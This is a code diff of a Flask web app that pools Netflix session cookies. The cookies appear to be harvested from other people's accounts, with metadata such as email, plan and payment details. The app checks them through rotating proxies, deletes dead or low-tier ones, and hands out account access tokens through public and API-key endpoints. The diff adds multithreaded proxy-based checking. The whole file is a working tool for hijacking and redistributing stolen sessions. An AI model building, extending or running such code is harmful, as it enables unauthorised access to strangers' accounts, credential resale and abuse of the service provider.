@@ -1,18 +1,15 @@
 # nftbot_all.py — single-process Flask app for Railway
 import os, json, re, time, sqlite3, threading, urllib.parse, secrets, hashlib, logging, random
 from contextlib import contextmanager
-from functools import wraps
 import requests
 from urllib3.exceptions import InsecureRequestWarning
-from flask import (Flask, request, jsonify, send_from_directory)
+from flask import Flask, request, jsonify, send_from_directory
 from flask_cors import CORS
 
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
-
 logging.basicConfig(level=logging.INFO)
 log = logging.getLogger("nftoken")
 
-# ---------------- config ----------------
 DB_PATH     = os.environ.get("POOL_DB", "/data/pool.db")
 PORT        = int(os.environ.get("PORT", "8080"))
 PANEL_PASS  = os.environ.get("PANEL_PASS", "")
@@ -21,13 +18,8 @@ MAX_FAILS   = 5
 
 os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
 
-# ---------------- background checker state ----------------
-checker_state = {
-    "running": False, "total": 0, "checked": 0,
-    "kept": 0, "deleted": 0, "logs": []
-}
+checker_state = {"running": False, "total": 0, "checked": 0, "kept": 0, "deleted": 0, "logs": []}
 
-# ---------------- netflix api ----------------
 API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 QUERY_PARAMS = {
     "appVersion": "15.48.1",
@@ -71,7 +63,6 @@ BASE_HEADERS = {
 }
 COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
 
-# ---------------- db ----------------
 SCHEMA = """
 CREATE TABLE IF NOT EXISTS cookies (
     id INTEGER PRIMARY KEY AUTOINCREMENT, raw TEXT NOT NULL,
@@ -94,6 +85,13 @@ CREATE TABLE IF NOT EXISTS api_keys (
 CREATE TABLE IF NOT EXISTS nonces (
     nonce TEXT PRIMARY KEY, ip TEXT, created_at REAL
 );
+CREATE TABLE IF NOT EXISTS checker_state (
+    id INTEGER PRIMARY KEY CHECK (id = 1),
+    running INTEGER NOT NULL DEFAULT 0,
+    total INTEGER NOT NULL DEFAULT 0, checked INTEGER NOT NULL DEFAULT 0,
+    kept INTEGER NOT NULL DEFAULT 0, deleted INTEGER NOT NULL DEFAULT 0,
+    logs TEXT NOT NULL DEFAULT '[]'
+);
 """
 _lock = threading.Lock()
 
@@ -108,10 +106,28 @@ def db():
         conn.close()
 
 def init_db():
-    with db() as c: c.executescript(SCHEMA)
+    with db() as c:
+        c.executescript(SCHEMA)
+        c.execute("INSERT OR IGNORE INTO checker_state(id, logs) VALUES(1, '[]')")
     log.info("database ready at %s", DB_PATH)
 
-# ---------------- api keys ----------------
+def _save_checker_state():
+    with _lock, db() as c:
+        c.execute(
+            "UPDATE checker_state SET running=?, total=?, checked=?, kept=?, deleted=?, logs=? WHERE id=1",
+            (1 if checker_state["running"] else 0, checker_state["total"],
+             checker_state["checked"], checker_state["kept"], checker_state["deleted"],
+             json.dumps(checker_state["logs"][-200:])))
+def _load_checker_state():
+    with db() as c:
+        row = c.execute("SELECT * FROM checker_state WHERE id=1").fetchone()
+    if not row: return
+    checker_state.update({
+        "running": bool(row["running"]), "total": row["total"],
+        "checked": row["checked"], "kept": row["kept"], "deleted": row["deleted"],
+        "logs": json.loads(row["logs"] or "[]")})
+
+# ---- api keys ----
 def hash_key(raw): return hashlib.sha256(raw.encode()).hexdigest()
 
 def create_api_key(label=None):
@@ -140,18 +156,12 @@ def list_api_keys():
 def revoke_api_key(kid):
     with _lock, db() as c: c.execute("UPDATE api_keys SET revoked=1 WHERE id=?", (kid,))
 
-def delete_api_key(kid):
-    with _lock, db() as c: c.execute("DELETE FROM api_keys WHERE id=?", (kid,))
-
-# ---------------- metadata ----------------
-FIELD_MAP = {
-    "email": r"–\s*Email:\s*(.+)", "verified": r"–\s*Verified:\s*(.+)",
-    "profile": r"–\s*Profile:\s*(.+)", "plan": r"–\s*Plan:\s*(.+)",
-    "next_billing": r"–\s*Next billing:\s*(.*)",
-    "extra_members": r"–\s*Extra members:\s*(.+)",
-    "country": r"–\s*Country:\s*(.+)", "payments": r"–\s*Payments:\s*(.+)",
-    "source_cookies": r"–\s*Cookies:\s*(.+)",
-}
+# ---- metadata ----
+FIELD_MAP = {"email": r"–\s*Email:\s*(.+)","verified": r"–\s*Verified:\s*(.+)",
+    "profile": r"–\s*Profile:\s*(.+)","plan": r"–\s*Plan:\s*(.+)",
+    "next_billing": r"–\s*Next billing:\s*(.*)","extra_members": r"–\s*Extra members:\s*(.+)",
+    "country": r"–\s*Country:\s*(.+)","payments": r"–\s*Payments:\s*(.+)",
+    "source_cookies": r"–\s*Cookies:\s*(.+)"}
 
 def parse_metadata(text):
     out = {}
@@ -163,7 +173,6 @@ def parse_metadata(text):
     if out.get("plan"): out["plan"] = out["plan"].strip().lower()
     return out
 
-# ---------------- cookie parsing / netflix ----------------
 def _decode(v):
     if isinstance(v, str) and "%" in v:
         try: return urllib.parse.unquote(v)
@@ -206,11 +215,10 @@ def fetch_token(netflix_id, proxy=None):
     r.raise_for_status()
     td = (((r.json().get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
     token = td.get("token"); expires = td.get("expires")
-    if not token: raise ValueError("no token in response (cookie expired/invalid)")
+    if not token: raise ValueError("no token in response")
     if isinstance(expires, int) and len(str(expires)) == 13: expires //= 1000
     return token, expires
 
-# ---------------- pool ops ----------------
 def add_cookie(raw_text, source=None):
     ck = extract_cookie_dict(raw_text); nid = ck.get("NetflixId")
     if not nid: raise ValueError("no NetflixId in cookie")
@@ -229,24 +237,23 @@ def add_cookie(raw_text, source=None):
                         (raw_text, nid, pid, meta_json, now))
         return cur.lastrowid, nid
 
-def add_cookies_bulk(text_blob, source=None):
-    text_blob = (text_blob or "").strip()
-    if not text_blob: return {"added": 0, "dupes": 0, "invalid": 0}
-    nid_count = len(re.findall(r"(?<!\w)NetflixId=", text_blob))
-    if nid_count <= 1:
-        try:
-            add_cookie(text_blob, source); return {"added": 1, "dupes": 0, "invalid": 0}
-        except ValueError as e:
-            if "already" in str(e): return {"added": 0, "dupes": 1, "invalid": 0}
-            return {"added": 0, "dupes": 0, "invalid": 1}
-    chunks = [c.strip() for c in re.split(r"\n\s*\n", text_blob) if c.strip()]
+def _split_cookie_chunks(text):
+    text = (text or "").strip()
+    if not text: return []
+    nid_count = len(re.findall(r"(?<!\w)NetflixId=", text))
+    if nid_count <= 1: return [text]
+    chunks = [c.strip() for c in re.split(r"\n\s*\n", text) if c.strip()]
     if len(chunks) == 1:
         buf, chunks = [], []
-        for ln in text_blob.splitlines():
+        for ln in text.splitlines():
             if re.search(r"(?<!\w)NetflixId=", ln) and buf:
                 chunks.append("\n".join(buf)); buf = [ln]
             else: buf.append(ln)
         if buf: chunks.append("\n".join(buf))
+    return chunks
+
+def add_cookies_bulk(text_blob, source=None):
+    chunks = _split_cookie_chunks(text_blob)
     added = dups = bad = 0
     for ch in chunks:
         if len(re.findall(r"(?<!\w)NetflixId=", ch)) != 1: bad += 1; continue
@@ -270,11 +277,9 @@ def _pick_random(plan=None, country=None):
     q = "SELECT id,netflix_id,profile_id,meta_json FROM cookies WHERE deleted=0 AND fail_count<?"
     args = [MAX_FAILS]
     if plan:
-        q += " AND json_extract(meta_json, '$.plan') = ?"
-        args.append(plan.lower())
+        q += " AND json_extract(meta_json, '$.plan') = ?"; args.append(plan.lower())
     if country:
-        q += " AND json_extract(meta_json, '$.country') = ?"
-        args.append(country.upper())
+        q += " AND json_extract(meta_json, '$.country') = ?"; args.append(country.upper())
     q += " ORDER BY RANDOM() LIMIT 1"
     with db() as c: return c.execute(q, args).fetchone()
 
@@ -320,130 +325,121 @@ def list_cookies(offset=0, limit=200, include_dead=False):
         except Exception: r["meta"] = {}
     return rows
 
-def revive_cookie(cid):
-    with _lock, db() as c:
-        c.execute("UPDATE cookies SET deleted=0,fail_count=0,last_error=NULL WHERE id=?", (cid,))
-
 def hard_delete(cid):
     with _lock, db() as c: c.execute("DELETE FROM cookies WHERE id=?", (cid,))
 
 def bulk_delete_all():
     with _lock, db() as c: c.execute("DELETE FROM cookies")
 
-# ---------------- Background Checker ----------------
+# ---- proxies + background checker ----
 def parse_proxy_line(line):
     line = line.strip()
     if not line or line.startswith("#"): return None
     line = re.sub(r"^([a-zA-Z][a-zA-Z0-9+.-]*):/+", r"\1://", line)
     line = re.sub(r"\s+", " ", line).strip()
-
-    m = re.match(
-        r"^(?P<scheme>https?|socks5h?|socks4a?)://"
-        r"(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?"
-        r"(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$",
-        line, re.IGNORECASE,
-    )
+    m = re.match(r"^(?P<scheme>https?|socks5h?|socks4a?)://(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line, re.IGNORECASE)
     if m:
-        d = m.groupdict(); scheme = d["scheme"].lower()
-        if d.get("user") and d.get("password"):
-            return f"{scheme}://{d['user']}:{d['password']}@{d['host']}:{d['port']}"
-        return f"{scheme}://{d['host']}:{d['port']}"
-
+        d = m.groupdict(); s = d["scheme"].lower()
+        return f"{s}://{d['user']}:{d['password']}@{d['host']}:{d['port']}" if d.get("user") else f"{s}://{d['host']}:{d['port']}"
     m = re.match(r"^(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@(?P<host>[^:\s]+):(?P<port>\d+)$", line)
     if m:
-        d = m.groupdict()
-        return f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"
-
+        d = m.groupdict(); return f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"
     m = re.match(r"^(?P<host>[^:\s]+):(?P<port>\d+)@(?P<user>[^:@\s]+):(?P<password>[^@\s]+)$", line)
     if m:
-        d = m.groupdict()
-        return f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"
-
-    m = re.match(r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line)
+        d = m.groupdict(); return f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"
+    m = re.match(r"^(?P<host>[^:\s]+):(?P<port>\d+)$", line)
     if m:
-        d = m.groupdict()
-        return f"http://{d['host']}:{d['port']}"
-
-    parts = line.split(":")
-    if len(parts) == 4:
-        a, b, c, d = parts
-        if b.isdigit() and not d.isdigit():
-            return f"http://{c}:{d}@{a}:{b}"
-        if d.isdigit() and not b.isdigit():
-            return f"http://{a}:{b}@{c}:{d}"
-
+        d = m.groupdict(); return f"http://{d['host']}:{d['port']}"
+    p = line.split(":")
+    if len(p) == 4:
+        a, b, c, d = p
+        if b.isdigit() and not d.isdigit(): return f"http://{c}:{d}@{a}:{b}"
+        if d.isdigit() and not b.isdigit(): return f"http://{a}:{b}@{c}:{d}"
     m = re.match(r"^(?P<host>[^:\s]+):(?P<port>\d+)\s*[|,;\s]\s*(?P<user>[^:\s]+):(?P<password>\S+)$", line)
     if m:
-        d = m.groupdict()
-        return f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"
-
+        d = m.groupdict(); return f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"
     return None
 
+def _parse_proxies(proxies_input):
+    raw = [l for l in (proxies_input or "").splitlines() if l.strip() and not l.strip().startswith("#")]
+    out = []
+    for l in raw:
+        p = parse_proxy_line(l)
+        if p: out.append(p)
+    return raw, out
+
 def run_checker(proxies_input):
-    raw_lines = [l for l in (proxies_input or "").splitlines() if l.strip() and not l.strip().startswith("#")]
-    proxies = []
-    for line in raw_lines:
-        p = parse_proxy_line(line)
-        if p: proxies.append(p)
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+    raw, proxies = _parse_proxies(proxies_input)
 
     global checker_state
     with _lock:
         checker_state.update({"running": True, "total": 0, "checked": 0,
                               "kept": 0, "deleted": 0, "logs": []})
 
-    checker_state["logs"].append(f"[PROXY] {len(raw_lines)} lines received, {len(proxies)} parsed OK")
+    checker_state["logs"].append(f"[PROXY] {len(raw)} lines received, {len(proxies)} parsed OK")
     for i, p in enumerate(proxies[:3], 1):
-        masked = re.sub(r"://.*?@", "://***:***@", p)
-        checker_state["logs"].append(f"[PROXY] #{i}: {masked}")
-    if raw_lines and not proxies:
-        checker_state["logs"].append("[PROXY] None parsed. Format: ip:port or user:pass@ip:port or ip:port:user:pass")
+        checker_state["logs"].append(f"[PROXY] #{i}: {re.sub(r'://.*?@', '://***:***@', p)}")
 
     with db() as c:
         rows = c.execute("SELECT id,netflix_id,meta_json FROM cookies WHERE deleted=0").fetchall()
         total = len(rows)
-
     checker_state["total"] = total
     checker_state["logs"].append(f"[START] Checking {total} cookies...")
+    _save_checker_state()
 
-    for idx, row in enumerate(rows, 1):
-        if not checker_state["running"]: break
-        cid = row["id"]; nid = row["netflix_id"]
+    worker_count = max(2, min((len(proxies) or 4), 8))
+
+    def worker(row):
+        if not checker_state["running"]: return ("skip", row["id"], None)
         proxy = random.choice(proxies) if proxies else None
-
         try:
-            fetch_token(nid, proxy=proxy)
-            meta = json.loads(row["meta_json"]) if row["meta_json"] else {}
-            plan = (meta.get("plan") or "").lower()
-            if plan in ("premium", "standard", "standard_with_ads"):
-                checker_state["kept"] += 1
-                checker_state["logs"].append(f"[{idx}/{total}] #{cid} KEPT ({plan})")
-            else:
-                checker_state["deleted"] += 1
-                checker_state["logs"].append(f"[{idx}/{total}] #{cid} DELETED (plan={plan or 'unknown'})")
-                with _lock, db() as c:
-                    c.execute("DELETE FROM cookies WHERE id=?", (cid,))
+            fetch_token(row["netflix_id"], proxy=proxy)
+            return ("ok", row["id"], row["meta_json"])
         except Exception as e:
-            err = str(e).lower()
-            if any(k in err for k in ("proxy", "timeout", "connect", "ssl")):
-                checker_state["logs"].append(f"[{idx}/{total}] #{cid} ERR ({err[:40]})")
-            else:
-                checker_state["deleted"] += 1
-                checker_state["logs"].append(f"[{idx}/{total}] #{cid} DELETED (dead)")
-                with _lock, db() as c:
-                    c.execute("DELETE FROM cookies WHERE id=?", (cid,))
+            return ("fail", row["id"], str(e))
 
-        checker_state["checked"] = idx
-        time.sleep(1.5)
+    with ThreadPoolExecutor(max_workers=worker_count) as pool:
+        futures = [pool.submit(worker, r) for r in rows]
+        for idx, fut in enumerate(as_completed(futures), 1):
+            status, cid, data = fut.result()
+            if status == "skip": continue
+            if status == "ok":
+                meta = json.loads(data) if data else {}
+                plan = (meta.get("plan") or "").lower()
+                if plan in ("premium", "standard", "standard_with_ads"):
+                    checker_state["kept"] += 1
+                    checker_state["logs"].append(f"[{idx}/{total}] #{cid} KEPT ({plan})")
+                else:
+                    checker_state["deleted"] += 1
+                    checker_state["logs"].append(f"[{idx}/{total}] #{cid} DELETED (plan={plan or 'unknown'})")
+                    with _lock, db() as c:
+                        c.execute("DELETE FROM cookies WHERE id=?", (cid,))
+            else:
+                err = (data or "").lower()
+                if any(k in err for k in ("proxy", "timeout", "connect", "ssl")):
+                    checker_state["logs"].append(f"[{idx}/{total}] #{cid} ERR ({err[:40]})")
+                else:
+                    checker_state["deleted"] += 1
+                    checker_state["logs"].append(f"[{idx}/{total}] #{cid} DELETED (dead)")
+                    with _lock, db() as c:
+                        c.execute("DELETE FROM cookies WHERE id=?", (cid,))
+            checker_state["checked"] = idx
+            if idx % 3 == 0 or idx == total:
+                _save_checker_state()
 
     checker_state["running"] = False
     checker_state["logs"].append("[DONE]")
+    _save_checker_state()
 
-# ---------------- app ----------------
+# ---- app ----
 app = Flask(__name__)
 CORS(app, origins="*", allow_headers=["Content-Type", "X-API-Key", "X-Admin-Pass"])
 app.secret_key = PANEL_SECRET
 app.config["MAX_CONTENT_LENGTH"] = 256 * 1024 * 1024
+
 init_db()
+_load_checker_state()
 
 @app.route("/", methods=["GET"])
 def health():
@@ -453,7 +449,6 @@ def health():
 def console():
     return send_from_directory(".", "index.html")
 
-# ---------------- public API ----------------
 def cleanup_nonces():
     with _lock, db() as c:
         c.execute("DELETE FROM nonces WHERE created_at < ?", (time.time() - 60,))
@@ -474,17 +469,12 @@ def public_generate():
     plan = data.get("plan", "").strip().lower()
     country = data.get("country", "").strip().upper()
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-
-    if not nonce:
-        return jsonify({"ok": False, "error": "Missing security challenge."}), 403
-
+    if not nonce: return jsonify({"ok": False, "error": "Missing challenge"}), 403
     cleanup_nonces()
     with _lock, db() as c:
         row = c.execute("SELECT nonce FROM nonces WHERE nonce=? AND ip=?", (nonce, ip)).fetchone()
-        if not row:
-            return jsonify({"ok": False, "error": "Invalid or expired challenge."}), 403
+        if not row: return jsonify({"ok": False, "error": "Invalid/expired challenge"}), 403
         c.execute("DELETE FROM nonces WHERE nonce=?", (nonce,))
-
     try:
         r = generate_link(plan=plan, country=country)
         r["meta"]["credit"] = "STYFAIR dev styfair (@styfair)"
@@ -493,12 +483,11 @@ def public_generate():
     except Exception as e:
         return jsonify({"ok": False, "error": str(e)}), 502
 
-# ---------------- private API ----------------
 @app.route("/api/generate", methods=["POST", "GET"])
 def api_generate():
     key = request.headers.get("X-API-Key") or (request.get_json(silent=True) or {}).get("api_key")
     ident = verify_api_key(key)
-    if not ident: return jsonify({"ok": False, "error": "invalid or revoked api key"}), 401
+    if not ident: return jsonify({"ok": False, "error": "invalid key"}), 401
     try:
         r = generate_link(api_key_id=ident["id"])
         r["meta"]["credit"] = "STFAIR dev styfair (@styfair)"
@@ -510,17 +499,14 @@ def api_generate():
 @app.route("/api/status", methods=["GET"])
 def api_status():
     ident = verify_api_key(request.headers.get("X-API-Key"))
-    if not ident: return jsonify({"ok": False, "error": "invalid or revoked api key"}), 401
+    if not ident: return jsonify({"ok": False, "error": "invalid key"}), 401
     return jsonify({"ok": True, **pool_stats()})
 
-# ---------------- admin API ----------------
-def verify_admin_pass():
-    return request.headers.get("X-Admin-Pass") == PANEL_PASS
+def verify_admin_pass(): return request.headers.get("X-Admin-Pass") == PANEL_PASS
 
 @app.route("/api/admin/verify", methods=["GET"])
 def admin_verify():
-    if not verify_admin_pass():
-        return jsonify({"ok": False, "error": "invalid password"}), 401
+    if not verify_admin_pass(): return jsonify({"ok": False}), 401
     return jsonify({"ok": True})
 
 @app.route("/api/admin/keys", methods=["GET", "POST"])
@@ -557,28 +543,54 @@ def admin_delete_all():
 @app.route("/api/admin/bulk", methods=["POST"])
 def admin_bulk():
     if not verify_admin_pass(): return jsonify({"ok": False}), 401
-    totals = {"added": 0, "dupes": 0, "invalid": 0, "files": 0}
+    check_first = request.form.get("check") == "1"
+    _, proxies = _parse_proxies(request.form.get("proxy", ""))
+    totals = {"added": 0, "dupes": 0, "invalid": 0, "dead": 0, "files": 0}
+
     for fs in request.files.getlist("files"):
         if not fs or not fs.filename: continue
         try: text = fs.read().decode("utf-8", errors="replace")
         except Exception: continue
-        r = add_cookies_bulk(text)
-        totals["added"] += r["added"]; totals["dupes"] += r["dupes"]
-        totals["invalid"] += r["invalid"]; totals["files"] += 1
+
+        if not check_first:
+            r = add_cookies_bulk(text)
+            totals["added"] += r["added"]; totals["dupes"] += r["dupes"]
+            totals["invalid"] += r["invalid"]; totals["files"] += 1
+            continue
+
+        for ch in _split_cookie_chunks(text):
+            ck = extract_cookie_dict(ch); nid = ck.get("NetflixId")
+            if not nid: totals["invalid"] += 1; continue
+            proxy = random.choice(proxies) if proxies else None
+            try:
+                fetch_token(nid, proxy=proxy)
+            except Exception:
+                totals["dead"] += 1; continue
+            try:
+                add_cookie(ch); totals["added"] += 1
+            except ValueError as e:
+                if "already" in str(e): totals["dupes"] += 1
+                else: totals["invalid"] += 1
+        totals["files"] += 1
+
     return jsonify({"ok": True, **totals})
 
 @app.route("/api/admin/checker/start", methods=["POST"])
 def admin_start_checker():
     if not verify_admin_pass(): return jsonify({"ok": False}), 401
     if checker_state["running"]:
-        return jsonify({"ok": False, "error": "Checker already running."}), 400
+        return jsonify({"ok": False, "error": "Already running"}), 400
     proxies = (request.get_json(silent=True) or {}).get("proxies", "")
-    threading.Thread(target=run_checker, args=(proxies,), daemon=True).start()
+    threading.Thread(target=run_checker, args=(proxies,), daemon=True, name="checker-worker").start()
     return jsonify({"ok": True})
 
 @app.route("/api/admin/checker/status", methods=["GET"])
 def admin_checker_status():
     if not verify_admin_pass(): return jsonify({"ok": False}), 401
+    _load_checker_state()
+    if checker_state["running"] and not any(t.name == "checker-worker" for t in threading.enumerate()):
+        checker_state["running"] = False
+        _save_checker_state()
     return jsonify(checker_state)
 
 if __name__ == "__main__":
